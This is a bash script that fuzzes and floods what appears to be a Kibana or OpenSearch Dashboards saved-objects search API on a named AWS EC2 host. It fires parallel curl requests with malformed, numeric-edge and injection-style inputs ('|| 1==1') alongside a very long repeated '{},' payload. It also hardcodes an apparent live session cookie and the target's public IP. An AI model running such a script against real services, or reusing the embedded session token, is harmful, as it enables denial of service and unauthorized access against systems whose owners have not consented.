#!/bin/bash

#top 45935 -> 46508
#bot 45931 -> 28134
long_payload=[$(for i in {1..5104}; do echo -n '{},'; done)]

short_payloads=(
        '--1'
        '"1"'
        '[{"1":"0"}]'
        '{"1":"0"}'
        '{"1":0}'
        '1/0'
        '-$1.00'
        '-1.00'
        '$1.00'
        '1.00'
        '1,0/0,0'
        '1.0/0.0'
        '1 000,00'
        '1 000.00'
        '1,000.00'
        '1.000,00'
        '1'000,00'
        '1'000.00'
        '1 000 000,00'
        '1 000 000.00'
        '1,000,000.00'
        '1.000.000,00'
        '1'000'000,00'
        '1'000'000.00'
        '[{"1":"0"},1]'
        '|| 1==1'
        '["1",{"1":"0"}]'
        '[1,{"1":"0"}]'
        '["1","2"]'
        '["1",2]'
        '[1,2]'
        '1/2'
        '١٢٣'
        '123456789012345678901234567890123456789'
        '1.7976931348623157e+308'
        '1e0'
        '"1e0"'
        '1E02'
        '-1E02'
        '-1E+02'
        '1E+02'
        '1e2'
        '"1e2"'
        '1E2)'
        '--1'
        '"1"'
        '[{"1":"0"}]'
        '{"1":"0"}'
        '{"1":0}'
        '1/0'
        '-$1.00'
        '-1.00'
        '$1.00'
        '1.00'
        '1,0/0,0'
        '1.0/0.0'
        '1 000,00'
        '1 000.00'
        '1,000.00'
        '1.000,00'
        '1'000,00'
        '1'000.00'
        '1 000 000,00'
        '1 000 000.00'
        '1,000,000.00'
        '1.000.000,00'
        '1'000'000,00'
        '1'000'000.00'
        '[{"1":"0"},1]'
        '|| 1==1'
        '["1",{"1":"0"}]'
        '[1,{"1":"0"}]'
        '["1","2"]'
        '["1",2]'
        '[1,2]'
        '1/2'
        '١٢٣'
        '123456789012345678901234567890123456789'
        '1.7976931348623157e+308'
        '1e0'
        '"1e0"'
        '1E02'
        '-1E02'
        '-1E+02'
        '1E+02'
        '1e2'
        '"1e2"'
        '1E2)')

end_point='44.230.32.221'
end_point='ec2-44-230-32-221.us-west-2.compute.amazonaws.com:5601'

cookie='security_authentication=Fe26.2**06eca5cac1b443faf7dfb4e8bd57f3e3ee1cc20123288427526f8f23e0147b64*cUjVHJTzO2pQkWWeiOPDDA*ZFrDNXBHakRfMrLfv64v6x84peLCAJyipLLNsRfk3xAH8FwCSegG40BW5AOCaTL60CxNf8b7GuXuyfgVAyd5D8nZoiviWrYjfH7BQQTteNw2mTrGVcLtWX-bxOO8IxWqf9yn9h1aZBO01XQqJj7ap2NB_TZd2bjyUBW5KuFD1JsSCbDRrFT_5QYplLgiQD5xhL7x1memGddvMgeHzxk0pS0um9BqC_uEqG8caNG1L6yIoBdaAHKHVfC-4OICied5m9gjZMMUbeb_gGdnr-nrDw**cdd721ef141dfa14661cdc228746a9395e7a15b3cb8bf9acafe017f27684713e*O3BL1DU1UT6xdknLdCnciMBJLi52Aj2sgrFzp-WnHO8'

long_request="$end_point/api/saved_objects/search/$long_payload"


for short_payload in "${short_payloads[@]}"; do
        short_request="$end_point/api/saved_objects/search/$short_payload"

        curl -g -b $cookie "$short_request" -w '%{size_request}-%{http_code}\n' -s -o /dev/null &
        curl -g -b $cookie "$long_request" -w '%{size_request}-%{http_code}\n' -s -o /dev/null &
        curl -g -b $cookie "$short_request" -w '%{size_request}-%{http_code}\n' -s -o /dev/null &
        curl -g -b $cookie "$long_request" -w '%{size_request}-%{http_code}\n' -s -o /dev/null &
        curl -g -b $cookie "$short_request" -w '%{size_request}-%{http_code}\n' -s -o /dev/null &
        curl -g -b $cookie "$long_request" -w '%{size_request}-%{http_code}\n' -s -o /dev/null &
        curl -g -b $cookie "$short_request" -w '%{size_request}-%{http_code}\n' -s -o /dev/null &
        curl -g -b $cookie "$long_request" -w '%{size_request}-%{http_code}\n' -s -o /dev/null &
done

echo $long_request | wc -c
